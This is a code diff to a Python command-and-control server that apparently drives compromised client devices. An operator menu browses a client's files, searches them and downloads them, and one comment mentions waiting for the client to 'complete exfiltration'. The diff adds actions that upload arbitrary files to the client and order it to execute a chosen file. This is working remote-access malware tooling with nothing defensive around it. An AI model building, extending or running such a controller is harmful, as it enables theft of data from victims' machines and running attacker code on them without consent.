@@ -6,6 +6,7 @@ import ssl
 from datetime import datetime
 import logging
 import argparse
+from time import sleep
 
 # Constants
 BUFFER_SIZE = 1024
@@ -16,11 +17,20 @@ ACTIONS = {
     3: "Filesize",
     4: "Search",
     5: "Download File",
-    6: "Close"
+    6: "Upload File",
+    7: "Execute File",
+    8: "Close"
 }
 
 # Setup logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("server.log"),
+        logging.StreamHandler()
+    ]
+)
 
 def setup_ssl_context(cert_file, key_file, ca_file):
     """
@@ -44,12 +54,31 @@ def receive_data(conn, filename):
     :param filename: Filename to save received data
     """
     os.makedirs(DATA_DIR, exist_ok=True)
-    with open(os.path.join(DATA_DIR, filename), 'wb') as f:
+    file_path = os.path.join(DATA_DIR, filename)
+    with open(file_path, 'wb') as f:
         while True:
             data = conn.recv(BUFFER_SIZE)
             if data == b"!":
                 break
             f.write(data)
+    logging.info(f"File saved to {file_path}")
+
+def send_file(conn, file_path, save_path):
+    """
+    Send file to the client.
+    :param conn: Client connection socket
+    :param file_path: Path of the file to send
+    :param save_path: Path where the client should save the file
+    """
+    if os.path.exists(file_path):
+        conn.sendall(save_path.encode())
+        with open(file_path, 'rb') as f:
+            while chunk := f.read(BUFFER_SIZE):
+                conn.sendall(chunk)
+        conn.sendall(b"!")
+        logging.info(f"File {file_path} sent to client to be saved as {save_path}")
+    else:
+        logging.error(f"File {file_path} does not exist")
 
 def handle_client(conn, addr):
     """
@@ -60,13 +89,14 @@ def handle_client(conn, addr):
     logging.info(f"Device {addr} connected.")
     try:
         while True:
-            print("\nList of actions: \n1. Get Tree \n2. Filetypes\n3. Filesize\n4. Search\n5. Download File\n6. Close\n")
-            action = int(input("Enter action code: "))
+            print("\nList of actions: \n1. Get Tree \n2. Filetypes\n3. Filesize\n4. Search\n5. Download File\n6. Upload File\n7. Execute File\n8. Close\n")
+            action = input("Enter action code: ")
 
-            if action not in ACTIONS:
+            if not action.isdigit() or int(action) not in ACTIONS:
                 logging.error("Invalid action code.")
                 continue
 
+            action = int(action)
             conn.sendall(action.to_bytes(1, byteorder='big'))
 
             if action == 1:
@@ -97,6 +127,21 @@ def handle_client(conn, addr):
                 sleep(10)  # Wait for the client to complete exfiltration
 
             elif action == 6:
+                file_path = input("Enter the path of the file to upload to the client: ")
+                save_path = input("Enter the path where the client should save the file: ")
+                if os.path.exists(file_path):
+                    conn.sendall(file_path.encode())
+                    logging.info(f"Sending file {file_path} to client")
+                    send_file(conn, file_path, save_path)
+                else:
+                    logging.error(f"File {file_path} does not exist")
+
+            elif action == 7:
+                file_path = input("Enter file path to execute on client: ")
+                conn.sendall(file_path.encode())
+                logging.info(f"Executing file {file_path} on client")
+
+            elif action == 8:
                 break
 
     except Exception as e:
